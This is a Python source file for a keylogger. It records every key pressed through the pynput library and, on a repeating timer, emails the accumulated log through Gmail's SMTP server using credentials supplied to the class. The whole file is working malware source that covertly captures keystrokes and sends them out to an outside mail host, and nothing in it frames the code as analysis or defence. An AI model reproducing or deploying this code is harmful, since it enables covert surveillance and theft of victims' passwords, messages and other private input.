#!usr/bin/env python
import pynput.keyboard
import threading
import smtplib
log=''

class KeyLogger:
    def __init__(self,interval_time, email, password):
        self.log='Keylogger started'
        self.interval_time=interval_time
        self.email=email
        self.password=password

    def append_to_log(self, string):
        self.log=self.log+string
    def reset_log(self):
        self.log=''
    def process_key_logger(self, key):
        try:
            current_key=str(key.char)
        except:
            if str(key)=='Key.space':
                current_key=' '
            else:
                current_key=str(key)
        # print(log)
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password,'\n\n'+ self.log)
        self.reset_log()
        timer =threading.Timer(self.interval_time,self.report)
        timer.start()

    def send_mail(self,email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # init tls connnection
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_logger)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()